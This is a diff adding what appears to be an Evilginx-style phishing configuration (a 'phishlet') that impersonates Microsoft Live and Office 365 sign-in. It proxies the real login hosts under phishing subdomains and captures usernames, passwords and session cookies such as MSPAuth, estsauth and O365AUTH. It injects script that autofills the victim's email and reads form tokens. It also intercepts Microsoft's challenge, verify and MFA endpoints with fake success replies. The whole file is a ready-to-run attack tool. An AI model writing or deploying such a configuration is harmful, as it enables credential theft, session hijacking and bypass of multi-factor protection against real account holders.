@@ -1,0 +1,256 @@
+min_ver: "3.0.0"
+redirect_url: "https://outlook.office.com/mail/"
+
+proxy_hosts:
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "live.com",
+      session: true,
+      is_landing: true,
+      
+    }
+  - {
+      phish_sub: "fpt",
+      orig_sub: "fpt",
+      domain: "live.com",
+      session: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "logon",
+      orig_sub: "login",
+      domain: "microsoft.com",
+      session: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "outlook",
+      orig_sub: "www",
+      domain: "office.com",
+      session: true,
+      auto_filter: true,
+    }
+
+sub_filters:
+  # Microsoft Live.com login domain replacements
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "fpt",
+      domain: "live.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "outlook",
+      domain: "office.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+
+  # Office 365 path handling
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "",
+      domain: "live.com",
+      search: '/ppsecure/post\\.srf',
+      replace: "/ppsecure/post.srf",
+      mimes: ["text/html", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "",
+      domain: "live.com",
+      search: 'fpt\\.live\\.com',
+      replace: "fpt.live.com",
+      mimes: ["text/html", "application/javascript"],
+    }
+
+auth_tokens:
+  # Microsoft Live.com / Office 365 session cookies
+  - domain: ".live.com"
+    keys:
+      [
+        "MSFPC",
+        "MSPAuth",
+        "MSPProf",
+        "ppft",
+        "estsauth",
+        "session_id",
+        "canary:regexp",
+        "cL",
+        "cltd",
+        "x-ms-client-version",
+      ]
+    type: "cookie"
+  - domain: ".office.com"
+    keys:
+      [
+        "O365AUTH",
+        "O365SESSION",
+        "excel",
+        "powerpoint",
+        "word",
+        "outlook_session:regexp",
+      ]
+    type: "cookie"
+  - domain: ".outlook.office.com"
+    keys: ["outlook_auth:regexp", "office_session:regexp"]
+    type: "cookie"
+  - domain: ".login.live.com"
+    keys: ["login_session:regexp", "PPFT:always"]
+    type: "cookie"
+
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  username_alt:
+    key: "loginfmt"
+    search: "(.*)"
+    type: "post"
+  username_query:
+    key: "username"
+    search: "(.*)"
+    type: "get"
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+  custom:
+    # Critical Microsoft state parameters
+    - key: "mkt"
+      search: "(.*)"
+      type: "get"
+    - key: "client_id"
+      search: "(.*)"
+      type: "get"
+    - key: "contextid"
+      search: "(.*)"
+      type: "get"
+    - key: "opid"
+      search: "(.*)"
+      type: "get"
+    - key: "bk"
+      search: "(.*)"
+      type: "get"
+    - key: "uaid"
+      search: "(.*)"
+      type: "get"
+    - key: "pid"
+      search: "(.*)"
+      type: "get"
+    # POST form tokens (CRITICAL)
+    - key: "PPFT"
+      search: "(.*)"
+      type: "post"
+    - key: "canary"
+      search: "(.*)"
+      type: "post"
+    - key: "session_id"
+      search: "(.*)"
+      type: "get"
+    - key: "CustomerId"
+      search: "(.*)"
+      type: "get"
+    - key: "PageId"
+      search: "(.*)"
+      type: "get"
+
+auth_urls:
+
+  - "/landingv2"
+
+login:
+  domain: "login.live.com"
+  path: "/ppsecure/post.srf?mkt=EN-US&username={username}&client_id=4765445b-32c6-49b0-83e6-1d93765276ca"
+
+force_post:
+  # Force standard Office 365 login parameters
+  - path: "/ppsecure/post.srf"
+    search:
+      - { key: "login", search: ".*" }
+      - { key: "passwd", search: ".*" }
+    force:
+      - { key: "NewUser", value: "1" }
+      - { key: "type", value: "11" }
+      - { key: "LoginOptions", value: "3" }
+      - { key: "fspost", value: "0" }
+      - { key: "i21", value: "0" }
+      - { key: "CookieDisclosure", value: "0" }
+    type: "post"
+
+js_inject:
+  # Auto-fill Office 365 login + preserve state tokens
+  - trigger_domains: ["login.live.com"]
+    trigger_paths: ["/ppsecure/post.srf"]
+    trigger_params: ["username"]
+    script: |
+      function office365Autofill() {
+        var loginFields = document.querySelectorAll('input[name="login"], input[name="loginfmt"], input[id*="login"], input[placeholder*="email"]');
+        var passwordField = document.querySelector('input[name="passwd"], input[type="password"]');
+        
+        if (loginFields.length > 0 && "{username}") {
+          loginFields.forEach(function(field) {
+            field.value = "{username}";
+          });
+        }
+        
+        if (passwordField) {
+          passwordField.focus();
+          passwordField.select();
+        }
+        
+        // Preserve critical tokens for session continuity
+        setTimeout(function() {
+          var ppft = document.querySelector('input[name="PPFT"]');
+          var canary = document.querySelector('input[name="canary"]');
+          console.log('O365 Tokens - PPFT:', ppft ? ppft.value.substring(0,20)+'...' : 'missing');
+          console.log('O365 Tokens - Canary:', canary ? canary.value.substring(0,20)+'...' : 'missing');
+        }, 1000);
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', office365Autofill);
+      } else {
+        setTimeout(office365Autofill, 500);
+      }
+
+intercept:
+  # Block Microsoft security challenges and error reporting
+  - {
+      domain: "login.live.com",
+      path: ".*(challenge|flow|bk|verify|security).*",
+      http_status: 200,
+      body: '{"success": true}',
+      mime: "application/json",
+    }
+  - {
+      domain: "login.live.com",
+      path: ".*(error|logout|report|fail).*",
+      http_status: 200,
+      body: "{}",
+      mime: "application/json",
+    }
+  - {
+      domain: "login.live.com",
+      path: "^/api/.*(mfa|auth|check).*",
+      http_status: 200,
+      body: '{"valid": true, "authenticated": true}',
+      mime: "application/json",
+    }
